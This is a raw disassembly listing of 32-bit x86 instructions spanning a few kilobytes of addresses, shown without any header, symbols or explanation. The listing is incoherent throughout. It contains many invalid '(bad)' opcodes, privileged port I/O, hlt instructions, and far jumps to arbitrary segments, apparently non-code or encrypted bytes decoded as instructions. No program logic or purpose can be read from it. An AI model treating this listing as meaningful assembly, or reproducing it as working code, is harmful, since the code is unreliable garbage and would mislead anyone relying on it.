  415f32:	retf   
  415f33:	ficomp DWORD PTR [edx]
  415f35:	repnz xchg esi,eax
  415f37:	jno    0x415f3c
  415f39:	sti    
  415f3a:	sbb    DWORD PTR [ecx-0x4c2f19a9],ebx
  415f40:	xor    eax,0x876b2c54
  415f45:	pop    eax
  415f46:	in     al,dx
  415f47:	into   
  415f48:	jns    0x415f12
  415f4a:	xor    ah,BYTE PTR [ebp-0x358cd084]
  415f50:	into   
  415f51:	adc    ch,BYTE PTR [eax+0x3]
  415f54:	int    0xaf
  415f56:	lods   eax,DWORD PTR ds:[esi]
  415f57:	addr16 dec ebx
  415f59:	hlt    
  415f5a:	xchg   ebx,eax
  415f5b:	out    0x5f,ax
  415f5e:	loope  0x415f97
  415f60:	sub    ah,BYTE PTR ds:0x8ba8c515
  415f66:	xor    edi,edx
  415f68:	mov    bh,0xee
  415f6a:	inc    edi
  415f6b:	mov    edx,0x5d21c9fa
  415f70:	xlat   BYTE PTR ds:[ebx]
  415f71:	add    ebx,DWORD PTR [ecx+0x210653d3]
  415f77:	xor    DWORD PTR [eax+0x48],ebp
  415f7a:	xor    eax,0x1ead09dd
  415f7f:	or     edx,eax
  415f81:	pop    ebx
  415f82:	xchg   ebp,eax
  415f83:	hlt    
  415f84:	inc    ebx
  415f85:	cmp    cl,BYTE PTR [esi]
  415f87:	and    dl,0x6d
  415f8a:	rcl    BYTE PTR [edi],cl
  415f8c:	adc    DWORD PTR [ebp+0x5e3e770b],ecx
  415f92:	mov    al,ds:0xbcb24c9d
  415f97:	push   0xfffffff8
  415f99:	mov    eax,0xaca44f3a
  415f9e:	adc    eax,0xd3eefbd3
  415fa3:	inc    eax
  415fa4:	mov    ebp,0xd4adeed3
  415fa9:	daa    
  415faa:	jmp    0xf431:0x8a8aa050
  415fb1:	das    
  415fb2:	dec    BYTE PTR [ecx]
  415fb4:	das    
  415fb5:	jno    0x415f8e
  415fb7:	mov    bh,0xa0
  415fb9:	in     eax,0xfd
  415fbb:	hlt    
  415fbc:	cmp    BYTE PTR [esi-0x7affcd21],0xb2
  415fc3:	in     eax,dx
  415fc4:	(bad)  [eax]
  415fc6:	xchg   DWORD PTR [eax-0x22],eax
  415fc9:	mov    dh,0x7d
  415fcb:	adc    al,0x2b
  415fcd:	imul   ebp,edx,0x77
  415fd0:	cwde   
  415fd1:	enter  0x53e9,0x57
  415fd5:	add    al,0x7d
  415fd7:	fisttp QWORD PTR [esi+0x6e]
  415fda:	retf   0xcb6f
  415fdd:	lea    edx,[edx+0x64e7f152]
  415fe3:	sub    bl,BYTE PTR ds:0xebe9ff84
  415fe9:	js     0x415f8d
  415feb:	sbb    ecx,esp
  415fed:	outs   dx,DWORD PTR ds:[esi]
  415fee:	call   0xcb7f6ef2
  415ff3:	ja     0x416059
  415ff5:	mov    esi,0x52c01c60
  415ffa:	sbb    al,0x68
  415ffc:	out    0x60,eax
  415ffe:	pop    edi
  415fff:	ins    BYTE PTR es:[edi],dx
  416000:	push   0xffffff92
  416002:	fs iret 
  416004:	xor    al,0x57
  416006:	jp     0x415fd8
  416008:	pop    edx
  416009:	ret    0x2fb7
  41600c:	mov    ah,BYTE PTR [ebx-0x36]
  41600f:	outs   dx,DWORD PTR ds:[esi]
  416010:	cmp    eax,0xaa3dcd50
  416015:	push   0xb3d4628a
  41601a:	shl    ebp,1
  41601c:	call   0x8afe:0xa4bbfc69
  416023:	test   al,0x4c
  416025:	push   esi
  416026:	(bad)  
  416027:	dec    ecx
  416028:	inc    esp
  416029:	push   0xa045a318
  41602e:	jl     0x416076
  416030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416031:	dec    ebx
  416032:	mov    ebx,0x469b7323
  416037:	and    DWORD PTR [ecx+0x54],esi
  41603a:	stos   BYTE PTR es:[edi],al
  41603b:	stc    
  41603c:	aas    
  41603d:	add    edx,DWORD PTR [eax-0x4f0cae14]
  416043:	es (bad) 
  416045:	cmc    
  416046:	mov    bl,0xad
  416048:	scas   eax,DWORD PTR es:[edi]
  416049:	aaa    
  41604a:	mov    cl,ah
  41604c:	shr    DWORD PTR [esp+ebp*2+0x2f],cl
  416050:	jg     0x4160c2
  416052:	xchg   DWORD PTR [edx+0x1c174b30],esp
  416058:	in     eax,dx
  416059:	push   ds
  41605a:	fwait
  41605b:	xor    BYTE PTR [eax+0x36cfdce6],0x3f
  416062:	dec    edi
  416063:	xchg   ecx,eax
  416064:	mov    ebx,esi
  416066:	xor    ah,BYTE PTR [ecx]
  416068:	mov    edi,0xace0f7c1
  41606d:	mov    ds:0x8f1059bd,al
  416072:	jle    0x416040
  416074:	sub    al,0x5f
  416076:	lds    esi,FWORD PTR [eiz*8+0x4fb205a0]
  41607d:	leave  
  41607e:	popa   
  41607f:	sbb    al,0x12
  416081:	inc    edx
  416082:	popa   
  416083:	xor    eax,0xcf09757c
  416088:	fchs   
  41608a:	add    BYTE PTR [eax],bl
  41608c:	mov    edi,0x1c28c320
  416091:	or     eax,0xa5e3fbd0
  416096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416097:	call   0xb700:0x6c65f8d1
  41609e:	xor    al,al
  4160a0:	addr16 sti 
  4160a2:	mov    dl,0xf9
  4160a4:	mov    ah,BYTE PTR [eax+0x5a]
  4160a7:	ja     0x416059
  4160a9:	xchg   edi,eax
  4160aa:	outs   dx,BYTE PTR ds:[esi]
  4160ab:	(bad)  
  4160ac:	mov    al,ds:0xf52821aa
  4160b1:	popf   
  4160b2:	fcmovnb st,st(2)
  4160b4:	nop
  4160b5:	mov    al,ds:0xd3c03745
  4160ba:	push   es
  4160bb:	das    
  4160bc:	mov    DWORD PTR [ebx-0x76471c15],esi
  4160c2:	fs push es
  4160c4:	pop    edx
  4160c5:	js     0x41605b
  4160c7:	push   ebx
  4160c8:	pop    esp
  4160c9:	push   ds
  4160ca:	rcr    DWORD PTR ds:0x606b7b97,0xa9
  4160d1:	repnz arpl WORD PTR [esi],cx
  4160d4:	cmp    eax,0x606e918b
  4160d9:	jb     0x416078
  4160db:	nop
  4160dc:	ror    bl,cl
  4160de:	in     eax,0x70
  4160e0:	sar    DWORD PTR [edx-0x99d2e7e],cl
  4160e6:	fwait
  4160e7:	xor    edi,DWORD PTR [esi+0x45b5b4f]
  4160ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160ee:	fild   QWORD PTR [ebp-0x5f728a42]
  4160f4:	xor    ecx,DWORD PTR [ecx+0xd]
  4160f7:	push   edi
  4160f8:	xchg   DWORD PTR [esi-0x37],edx
  4160fb:	xchg   DWORD PTR [esi+0x4d4f7864],ebx
  416101:	mov    esi,0xe3303fd4
  416106:	jns    0x4160dd
  416108:	mov    eax,ecx
  41610a:	dec    eax
  41610b:	in     eax,0x53
  41610d:	sahf   
  41610e:	ror    DWORD PTR [ebp+0x45],cl
  416111:	loopne 0x41609b
  416113:	push   0x23
  416115:	ss out dx,al
  416117:	and    cl,BYTE PTR [esi+edi*1+0x14]
  41611b:	cmp    ah,BYTE PTR [edx-0x38]
  41611e:	jecxz  0x416170
  416120:	pop    ebx
  416121:	cmp    esi,ecx
  416123:	jb     0x4161a1
  416125:	retf   
  416126:	adc    ecx,esp
  416128:	dec    edi
  416129:	or     ebx,eax
  41612b:	test   BYTE PTR [esi],ah
  41612d:	ja     0x416134
  41612f:	mov    bh,BYTE PTR [ebx]
  416131:	sbb    DWORD PTR es:[edx+edi*2-0xa4c22e3],ebx
  416139:	idiv   ch
  41613b:	mov    ah,0x79
  41613d:	dec    edi
  41613e:	mov    ds:0xa355c683,eax
  416143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416144:	cmp    DWORD PTR [eax+0x7739b7f0],eax
  41614a:	mov    esi,DWORD PTR ds:[eax]
  41614d:	leave  
  41614e:	test   bh,dh
  416150:	stos   DWORD PTR es:[edi],eax
  416151:	mov    gs,WORD PTR [ebx+0x5dd24a24]
  416157:	pop    es
  416158:	pop    ss
  416159:	test   eax,0x99e6f6ae
  41615e:	mov    DWORD PTR [ebx-0x33],ebp
  416161:	inc    ebx
  416162:	xor    BYTE PTR [ecx+0x28],dh
  416165:	call   FWORD PTR [ebx]
  416167:	ja     0x4161e4
  416169:	xchg   ebp,eax
  41616a:	sbb    BYTE PTR [esp-0x2e74065],ch
  416171:	adc    eax,0xaed7af93
  416176:	stos   BYTE PTR es:[edi],al
  416177:	(bad)  
  416178:	cmp    bl,BYTE PTR [eax+0x7a]
  41617b:	jne    0x41617f
  41617d:	ficomp WORD PTR [ebp+0x181f380]
  416183:	call   0x7f6c:0x7feb6137
  41618a:	xlat   BYTE PTR ds:[ebx]
  41618b:	jl     0x41617e
  41618d:	test   BYTE PTR [esi+0x73],ch
  416190:	xchg   ebp,eax
  416191:	in     al,0x34
  416193:	or     esi,esp
  416195:	call   0x64da7b02
  41619a:	jo     0x4161b7
  41619c:	mov    dl,0xc8
  41619e:	cli    
  41619f:	clc    
  4161a0:	ins    DWORD PTR es:[edi],dx
  4161a1:	in     al,dx
  4161a2:	jmp    0xc56330ae
  4161a7:	or     al,0x83
  4161a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161aa:	push   eax
  4161ab:	les    edx,FWORD PTR [eax-0x3f347e0d]
  4161b1:	imul   DWORD PTR ds:0xf2258ab6
  4161b7:	icebp  
  4161b8:	js     0x416160
  4161ba:	in     eax,0x5f
  4161bc:	inc    esi
  4161bd:	ins    BYTE PTR es:[edi],dx
  4161be:	cli    
  4161bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161c0:	repz int3 
  4161c2:	inc    eax
  4161c3:	rcl    DWORD PTR [ebx+ebx*8-0x24],cl
  4161c7:	cmp    al,0x2a
  4161c9:	out    dx,al
  4161ca:	mov    esi,0xa23bf6e9
  4161cf:	lahf   
  4161d0:	and    al,0x27
  4161d2:	(bad)  
  4161d3:	das    
  4161d4:	imul   ebx,DWORD PTR [edi-0x4b],0xffffffec
  4161d8:	les    edx,FWORD PTR [eax-0x2034695b]
  4161de:	inc    edx
  4161df:	loopne 0x416196
  4161e1:	fnsave [edi+edx*4-0x2535ab55]
  4161e8:	retf   0xecb2
  4161eb:	inc    esp
  4161ec:	mov    bh,0x92
  4161ee:	ficomp WORD PTR [ebx+0x6ae751fd]
  4161f4:	gs xchg DWORD PTR cs:[ecx],ebp
  4161f8:	cmp    DWORD PTR [esi+0x408f2e92],0xc127e3fd
  416202:	push   0x66
  416204:	push   ss
  416205:	inc    ecx
  416206:	test   eax,0x2f48fefc
  41620b:	push   0xffffffa6
  41620d:	repz cmp ebp,DWORD PTR ds:[ebx]
  416211:	add    eax,eax
  416213:	adc    edi,DWORD PTR [ebx]
  416215:	out    0xba,al
  416217:	ja     0x4161a8
  416219:	jle    0x416244
  41621b:	or     al,0x1a
  41621d:	cmp    dh,bl
  41621f:	retf   
  416220:	aaa    
  416221:	sbb    ah,BYTE PTR [ebp*1-0x4e76808d]
  416228:	jbe    0x4161e9
  41622a:	shr    BYTE PTR [esp+edi*1+0x6c8eb8ac],1
  416231:	lea    edx,[eax+0x1d58f79d]
  416237:	mov    dl,al
  416239:	push   ebx
  41623a:	rol    DWORD PTR [ebx-0x5bae7091],1
  416240:	mov    esi,0x70852969
  416245:	push   es
  416246:	(bad)  
  416247:	mov    ebp,0x3b29984d
  41624c:	out    dx,eax
  41624d:	out    dx,eax
  41624e:	ror    BYTE PTR [esi-0x6f1b7fb],1
  416254:	mov    ebx,0xbb44cbd7
  416259:	mov    eax,0x92980975
  41625e:	(bad)  
  41625f:	or     eax,0x1aeaf03e
  416264:	pop    ebp
  416265:	sbb    DWORD PTR [esi],edx
  416267:	out    dx,eax
  416268:	out    0x8a,al
  41626a:	pushf  
  41626b:	sub    eax,0x1691f887
  416270:	xor    ebx,ebp
  416272:	or     BYTE PTR [ecx],0x23
  416275:	mov    dl,0xcf
  416277:	ror    esi,cl
  416279:	xor    al,0xa8
  41627b:	out    dx,al
  41627c:	pushf  
  41627d:	sbb    al,0x28
  41627f:	fisub  WORD PTR [ebx]
  416281:	(bad)  
  416283:	pop    ecx
  416284:	jmp    0x9fc2:0xf29ca0f5
  41628b:	xchg   esi,eax
  41628c:	popa   
  41628d:	adc    edx,DWORD PTR [esi+esi*1+0x4a]
  416291:	aam    0x2a
  416293:	jmp    0x9f33:0x9ab3059
  41629a:	(bad)  
  41629b:	ror    BYTE PTR [eax+0x196729bf],1
  4162a1:	adc    BYTE PTR [esi+0x5d],al
  4162a4:	add    ebx,esp
  4162a6:	imul   DWORD PTR [edx-0x230046be]
  4162ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162ad:	loopne 0x416319
  4162af:	cmp    eax,0x42606903
  4162b4:	rcl    BYTE PTR [ebx+0x18deb82c],1
  4162ba:	jo     0x41628f
  4162bc:	popf   
  4162bd:	add    DWORD PTR [ecx+0x57],esi
  4162c0:	out    0x5,eax
  4162c2:	and    DWORD PTR [esi+ebx*2],eax
  4162c5:	fist   WORD PTR ds:0xf88b66a3
  4162cb:	add    al,0x7
  4162cd:	fwait
  4162ce:	lods   eax,DWORD PTR ds:[esi]
  4162cf:	mov    DWORD PTR [edx],0x917e41f2
  4162d5:	cdq    
  4162d6:	add    BYTE PTR [ebp+0x447be644],0x52
  4162dd:	jnp    0x416261
  4162df:	push   ebx
  4162e0:	(bad)  
  4162e1:	xor    al,0x2d
  4162e3:	jecxz  0x416364
  4162e5:	mov    eax,ds:0xa5e97d07
  4162ea:	push   cs
  4162eb:	jmp    0xcc04:0xb1fa700a
  4162f2:	pop    esp
  4162f3:	and    DWORD PTR [ebx],ebx
  4162f5:	retf   0xba0
  4162f8:	push   eax
  4162f9:	add    al,0xba
  4162fb:	dec    eax
  4162fc:	pop    edi
  4162fd:	dec    ebp
  4162fe:	jb     0x4162e2
  416300:	pusha  
  416301:	imul   esi,DWORD PTR [ecx+0x50],0xcc9a61c4
  416308:	icebp  
  416309:	push   ebx
  41630a:	jns    0x416310
  41630c:	outs   dx,BYTE PTR ds:[esi]
  41630d:	or     ch,dh
  41630f:	fwait
  416310:	fwait
  416311:	lea    edi,[ebp+0x4e]
  416314:	stc    
  416315:	fsubr  QWORD PTR [edi-0x3f]
  416318:	mov    cl,0x0
  41631a:	repnz int3 
  41631c:	mov    eax,ds:0xe626b5bf
  416321:	push   cs
  416322:	jge    0x4163a3
  416324:	add    BYTE PTR [edi+0x5e7fd3b7],0x35
  41632b:	adc    al,0x58
  41632d:	fidiv  WORD PTR [ebp+0x55]
  416330:	cmp    eax,0x30b330e7
  416335:	sbb    eax,0x26b7c36f
  41633a:	xlat   BYTE PTR ds:[ebx]
  41633b:	and    DWORD PTR [eax+ebx*8],ebx
  41633e:	imul   eax,DWORD PTR [esi-0x6cba18ee],0x22
  416345:	sahf   
  416346:	iret   
  416347:	jbe    0x416303
  416349:	stc    
  41634a:	or     bh,BYTE PTR [esi]
  41634c:	and    DWORD PTR [edx+0x34],edi
  41634f:	ret    0x9c4f
  416352:	mov    es,WORD PTR [ebp-0x5a]
  416355:	lea    ecx,[ebp+0x6b]
  416358:	jno    0x416377
  41635a:	ins    BYTE PTR es:[edi],dx
  41635b:	(bad)
  41635e:	xor    eax,0x2e9d6b50
  416363:	pop    ss
  416364:	fild   QWORD PTR [ecx+0x1b60a6fb]
  41636a:	je     0x416390
  41636c:	push   ebp
  41636d:	in     al,dx
  41636e:	in     al,0x7
  416370:	sbb    BYTE PTR [eax-0x649ed89],al
  416376:	mov    al,ds:0x2de6d297
  41637b:	and    eax,0x18613bf0
  416380:	out    0xc4,al
  416382:	mov    bh,0x4f
  416384:	add    ah,BYTE PTR gs:[edi-0x48811d1e]
  41638b:	sbb    BYTE PTR [ecx+0x102e254d],ah
  416391:	mov    esp,0x5a631651
  416396:	sbb    dh,BYTE PTR [ebx+0x65d0f13c]
  41639c:	aad    0xc8
  41639e:	mov    BYTE PTR [ebx+0x55a2bbd8],dl
  4163a4:	push   esp
  4163a5:	xor    eax,DWORD PTR [esi]
  4163a7:	adc    esp,edx
  4163a9:	inc    edi
  4163aa:	sub    eax,0x65203a0a
  4163af:	pusha  
  4163b0:	stos   DWORD PTR es:[edi],eax
  4163b1:	xor    eax,0xdc8e28b5
  4163b6:	mov    bh,0x77
  4163b8:	pop    DWORD PTR [ecx-0x73]
  4163bb:	or     bh,BYTE PTR [ebp+ecx*8+0x4b]
  4163bf:	repnz or BYTE PTR [esi],cl
  4163c2:	sbb    cl,dh
  4163c4:	cmp    al,0x27
  4163c6:	add    edx,DWORD PTR [ecx]
  4163c8:	add    ch,BYTE PTR [edx-0x745b5a59]
  4163ce:	inc    esi
  4163cf:	nop
  4163d0:	ret    
  4163d1:	lods   eax,DWORD PTR ds:[esi]
  4163d2:	xor    bl,BYTE PTR [esi+0x7c]
  4163d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d6:	mov    es,WORD PTR [esi]
  4163d8:	sub    eax,0xa67cafe
  4163dd:	pop    ebp
  4163de:	and    BYTE PTR [esi-0x40a63d26],ah
  4163e4:	or     DWORD PTR [eax+0x4a],eax
  4163e7:	adc    al,0x1
  4163e9:	dec    esi
  4163ea:	mov    edi,0x574db63a
  4163ef:	pop    edi
  4163f0:	fwait
  4163f1:	dec    edx
  4163f2:	or     al,0xed
  4163f4:	add    BYTE PTR [esi],bh
  4163f6:	mov    ds,WORD PTR ds:0xaa044575
  4163fc:	mov    ch,0x23
  4163fe:	jnp    0x41643e
  416400:	sbb    bh,BYTE PTR [ecx-0x2651af2e]
  416406:	(bad)  [edi+0x61480da0]
  41640c:	sbb    DWORD PTR [ecx+0x5e8fa9a6],ebp
  416412:	hlt    
  416413:	repz xchg ecx,eax
  416415:	jg     0x41644e
  416417:	aad    0x5d
  416419:	cmp    eax,0x8e1ca90b
  41641e:	mov    ebp,0xc3815a82
  416423:	sbb    eax,0x15a0b484
  416428:	in     al,dx
  416429:	or     esi,eax
  41642b:	xchg   edx,eax
  41642c:	shl    BYTE PTR [edi+edx*2+0x37510759],0x31
  416434:	cwd    
  416436:	(bad)  
  416437:	neg    ah
  416439:	aas    
  41643a:	cmp    BYTE PTR [edx],ah
  41643c:	push   ebp
  41643d:	imul   ebx,esp,0xa860e561
  416443:	mov    ch,0x5e
  416445:	mov    ds:0x9c70679b,al
  41644a:	repnz pop edi
  41644c:	nop
  41644d:	nop
  41644e:	(bad)  
  41644f:	std    
  416450:	stos   DWORD PTR es:[edi],eax
  416451:	xchg   edx,eax
  416452:	lds    esp,FWORD PTR [ebx+0x77c6a242]
  416458:	push   cs
  416459:	addr16 repnz xchg ebp,eax
  41645c:	in     eax,0xcf
  41645e:	in     al,dx
  41645f:	push   ecx
  416460:	sub    esp,ebp
  416462:	lds    eax,FWORD PTR ds:0x78f8ea88
  416468:	dec    esi
  416469:	hlt    
  41646a:	stos   DWORD PTR es:[edi],eax
  41646b:	imul   esi,DWORD PTR [esi+0x4f5d61e8],0xffffffe9
  416472:	ins    DWORD PTR es:[edi],dx
  416473:	mov    al,ds:0x6672d6a7
  416478:	mov    gs,edi
  41647a:	sahf   
  41647b:	fdivr  DWORD PTR [ecx]
  41647d:	jns    0x416404
  41647f:	aaa    
  416480:	pop    ebp
  416481:	pop    esp
  416482:	jmp    0x4e9d:0x29bd9b0a
  416489:	push   es
  41648a:	dec    ebp
  41648b:	or     bl,BYTE PTR [edx]
  41648d:	push   0xffffffd4
  41648f:	clc    
  416490:	sar    BYTE PTR [edx],cl
  416492:	test   DWORD PTR [eax+0x75],edx
  416495:	xchg   esp,eax
  416496:	cmp    eax,0x513b2b89
  41649b:	mov    ds:0x6a2da22a,eax
  4164a0:	fmul   DWORD PTR [esp+ebp*1-0x3b]
  4164a4:	adc    al,0x20
  4164a6:	jp     0x4164c6
  4164a8:	xchg   esi,eax
  4164a9:	popf   
  4164aa:	xchg   edx,eax
  4164ab:	fimul  DWORD PTR [eax]
  4164ad:	jl     0x4164f9
  4164af:	sbb    ch,bh
  4164b1:	adc    eax,DWORD PTR [edi*1-0x4ded9c88]
  4164b8:	or     eax,0xd9011db3
  4164bd:	xor    BYTE PTR [ebp+0x21],dl
  4164c0:	cld    
  4164c1:	add    dl,BYTE PTR [eax+0x7f]
  4164c4:	push   ebp
  4164c5:	leave  
  4164c6:	push   eax
  4164c7:	push   edx
  4164c8:	pop    ss
  4164c9:	mov    cl,0x6f
  4164cb:	(bad)
  4164cf:	pop    eax
  4164d0:	push   0xffffffac
  4164d2:	stos   DWORD PTR es:[edi],eax
  4164d3:	clc    
  4164d4:	dec    edi
  4164d5:	xor    BYTE PTR [edx+0x17484552],ah
  4164db:	inc    esi
  4164dc:	das    
  4164dd:	push   edx
  4164de:	dec    ecx
  4164df:	mov    ebx,0xb72e7971
  4164e4:	fimul  DWORD PTR [ebx+0x2a]
  4164e7:	(bad)  
  4164e9:	mov    ebx,0x4010b81b
  4164ee:	test   eax,0xe75183ee
  4164f3:	iret   
  4164f4:	xlat   BYTE PTR ds:[ebx]
  4164f5:	ror    DWORD PTR [eax+0x3b],1
  4164f8:	xchg   ecx,eax
  4164f9:	jbe    0x416515
  4164fb:	test   DWORD PTR [ecx+esi*1],esi
  4164fe:	mov    ebp,DWORD PTR [esi]
  416500:	xchg   edi,eax
  416501:	test   DWORD PTR [edi-0x539284ce],esi
  416507:	inc    ecx
  416508:	ss pop ss
  41650a:	jmp    0xc6e22b82
  41650f:	jge    0x41656b
  416511:	fwait
  416512:	push   0xffffff9d
  416514:	push   edx
  416515:	arpl   WORD PTR [ebx],ax
  416517:	ficomp WORD PTR ds:0xa40fd739
  41651d:	dec    esi
  41651e:	aad    0xfe
  416520:	lods   eax,DWORD PTR ds:[esi]
  416521:	mov    ds:0xe6b2185b,al
  416526:	retf   
  416527:	lahf   
  416528:	popa   
  416529:	jmp    0x9a9dc03e
  41652e:	outs   dx,DWORD PTR ds:[si]
  416530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416531:	or     DWORD PTR [eax-0x1c],ecx
  416534:	inc    ecx
  416535:	and    al,0xf7
  416537:	xlat   BYTE PTR ds:[ebx]
  416538:	cmc    
  416539:	shl    DWORD PTR [eax+0x36],1
  41653c:	stc    
  41653d:	xchg   cl,ch
  41653f:	aam    0xc4
  416541:	inc    eax
  416542:	pop    ebx
  416543:	push   cs
  416544:	les    esi,FWORD PTR [edx+eiz*1+0xf6a205f]
  41654b:	scas   eax,DWORD PTR es:[edi]
  41654c:	ret    
  41654d:	idiv   BYTE PTR [ebx]
  41654f:	loope  0x4165af
  416551:	sub    DWORD PTR [ecx-0x5d],edi
  416554:	in     al,dx
  416555:	sub    bh,bl
  416557:	out    0x33,al
  416559:	inc    edx
  41655a:	cmp    DWORD PTR [esi+esi*2+0xb8b95a7],0x7a
  416562:	add    al,0xe8
  416564:	int    0xd6
  416566:	cmp    dl,BYTE PTR [esi+edi*1]
  416569:	in     eax,0xef
  41656b:	cmp    al,0x95
  41656d:	dec    ebx
  41656e:	cmp    DWORD PTR ds:0x962faf68,ebp
  416574:	pop    esp
  416575:	push   edi
  416576:	shl    DWORD PTR [esi],1
  416578:	popf   
  416579:	jae    0x41655f
  41657b:	stc    
  41657c:	imul   edx,ecx,0x47
  41657f:	xlat   BYTE PTR ds:[ebx]
  416580:	mov    cl,0x45
  416582:	mov    edi,DWORD PTR [edx]
  416584:	aam    0x79
  416586:	mov    ch,0x25
  416588:	mov    ch,0x6f
  41658a:	inc    eax
  41658b:	loopne 0x416522
  41658d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41658e:	dec    eax
  41658f:	jns    0x416565
  416591:	sbb    al,dh
  416593:	jg     0x416572
  416595:	xchg   DWORD PTR [eax+ebp*8-0x58dbc2f0],ecx
  41659c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41659d:	push   ebp
  41659e:	and    bl,BYTE PTR [ebp+0x373b8be5]
  4165a4:	pop    edx
  4165a5:	push   ebx
  4165a6:	outs   dx,DWORD PTR ds:[esi]
  4165a7:	mov    bl,0x6f
  4165a9:	sbb    al,ch
  4165ab:	dec    edi
  4165ac:	jmp    0x4165b6
  4165ae:	es int 0x8a
  4165b1:	std    
  4165b2:	mov    ah,0xd6
  4165b4:	dec    eax
  4165b5:	push   esi
  4165b6:	dec    edi
  4165b7:	test   BYTE PTR [ecx],dh
  4165b9:	shl    BYTE PTR [edx],0xb8
  4165bc:	bound  edx,QWORD PTR [eax-0x1a3dfad2]
  4165c2:	xor    BYTE PTR [ebx+0x33],al
  4165c5:	cmp    bl,ah
  4165c7:	sbb    eax,0x6632158d
  4165cc:	pop    ebp
  4165cd:	fld    QWORD PTR [esi]
  4165cf:	addr16 xchg ebp,eax
  4165d1:	(bad)  
  4165d2:	out    dx,al
  4165d3:	pop    ebx
  4165d4:	xor    al,BYTE PTR [eax]
  4165d6:	es push eax
  4165d8:	and    al,0xa9
  4165da:	sti    
  4165db:	and    eax,0xe7622e7d
  4165e0:	jle    0x416583
  4165e2:	push   es
  4165e3:	ss mov ebp,0x3e370cce
  4165e9:	popa   
  4165ea:	pop    ss
  4165eb:	dec    edx
  4165ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165ed:	fist   WORD PTR [ebp+0x3d]
  4165f0:	jnp    0x416651
  4165f2:	iret   
  4165f3:	and    BYTE PTR [esi],bl
  4165f5:	or     DWORD PTR [ebp+0x53],edi
  4165f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165f9:	cli    
  4165fa:	pusha  
  4165fb:	add    al,0x18
  4165fd:	mov    BYTE PTR [ebx-0x63],al
  416600:	fidivr WORD PTR ds:0x1d602625
  416606:	fnstcw WORD PTR [edx-0x4b]
  416609:	rcl    ecx,0xd4
  41660c:	push   ss
  41660d:	adc    edx,DWORD PTR [eax+0x34362d25]
  416613:	loop   0x4165c8
  416615:	push   ebp
  416616:	or     bh,al
  416618:	iret   
  416619:	lahf   
  41661a:	xor    cl,BYTE PTR [esi+0x580d4694]
  416620:	pop    ds
  416621:	add    BYTE PTR [eax-0x71],dh
  416624:	jmp    0x3c23:0x314291c7
  41662b:	or     DWORD PTR [edi+0x118e2da8],edx
  416631:	daa    
  416632:	inc    edi
  416633:	fwait
  416634:	inc    ebx
  416635:	ja     0x41662c
  416637:	lock and al,0xc2
  41663a:	stc    
  41663b:	ja     0x4166b0
  41663d:	into   
  41663e:	fimul  WORD PTR [edi+esi*4+0x54136a78]
  416645:	sahf   
  416646:	xchg   ecx,eax
  416647:	ror    BYTE PTR [edi],0xf9
  41664a:	ja     0x416648
  41664c:	idiv   DWORD PTR [ebx]
  41664e:	dec    esi
  41664f:	int    0x53
  416651:	(bad)  
  416653:	push   cs
  416654:	pop    ebp
  416655:	and    dh,BYTE PTR [esi-0x75]
  416658:	jmp    0x210aea17
  41665d:	xor    DWORD PTR [ecx],esp
  41665f:	lods   eax,DWORD PTR ds:[esi]
  416660:	fild   WORD PTR [eax+0x75ad7e18]
  416666:	jo     0x416687
  416668:	loope  0x416690
  41666a:	inc    ebx
  41666b:	fild   QWORD PTR [edi-0x78532777]
  416671:	mov    ds:0x8290577d,eax
  416676:	jb     0x4166d0
  416678:	ret    
  416679:	(bad)
  41667d:	xchg   DWORD PTR [eax],esi
  41667f:	loopne 0x416652
  416681:	repnz sub ebx,esp
  416684:	jmp    0x86ce:0xee969727
  41668b:	enter  0x6f6a,0x20
  41668f:	not    bl
  416691:	(bad)  
  416692:	push   esp
  416693:	inc    edi
  416694:	in     al,dx
  416695:	jnp    0x4166d2
  416697:	aad    0x3d
  416699:	and    DWORD PTR [ebx],ebx
  41669b:	inc    ebx
  41669c:	sbb    cl,al
  41669e:	cmp    BYTE PTR [ebp+edx*1+0x67f85c1e],bh
  4166a5:	and    eax,0xdda48308
  4166aa:	sub    al,BYTE PTR [edi+0x4a]
  4166ad:	and    eax,0x9aebcff8
  4166b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166b3:	repz leave 
  4166b5:	add    eax,0x8820f92b
  4166ba:	sbb    DWORD PTR [ecx],edx
  4166bc:	adc    al,0x33
  4166be:	test   eax,0x1ac7124
  4166c3:	popa   
  4166c4:	(bad)  
  4166c5:	cmc    
  4166c6:	and    DWORD PTR ds:0x193f3129,eax
  4166cc:	mov    ds:0xc5e8b304,al
  4166d1:	enter  0x5189,0x18
  4166d5:	sbb    DWORD PTR [ecx],eax
  4166d7:	dec    edi
  4166d8:	or     edx,ebx
  4166da:	jg     0x41670a
  4166dc:	popa   
  4166dd:	scas   al,BYTE PTR es:[edi]
  4166de:	pop    edi
  4166df:	cli    
  4166e0:	cs jae 0x41672a
  4166e3:	fsub   st(2),st
  4166e5:	dec    eax
  4166e6:	fwait
  4166e7:	inc    eax
  4166e8:	ret    0x3265
  4166eb:	(bad)  
  4166ec:	cmp    edx,esp
  4166ee:	stc    
  4166ef:	sbb    edx,edi
  4166f1:	push   edx
  4166f2:	push   edi
  4166f3:	cmp    al,0x5
  4166f5:	call   FWORD PTR [ebx-0x3a]
  4166f8:	jmp    0x41676e
  4166fa:	shr    DWORD PTR [ebp+0x6aea0776],1
  416700:	bnd jno 0x416709
  416703:	mov    bh,0xaf
  416705:	pop    ebx
  416706:	cmc    
  416707:	adc    dl,BYTE PTR [eax]
  416709:	sar    BYTE PTR [ebp-0x30],1
  41670c:	dec    ebx
  41670d:	mov    eax,0x738cdac4
  416712:	int3   
  416713:	push   eax
  416714:	aam    0x2d
  416716:	test   BYTE PTR [ecx+0x19],al
  416719:	xor    al,0x97
  41671b:	cli    
  41671c:	ja     0x416721
  41671e:	fs pop ebx
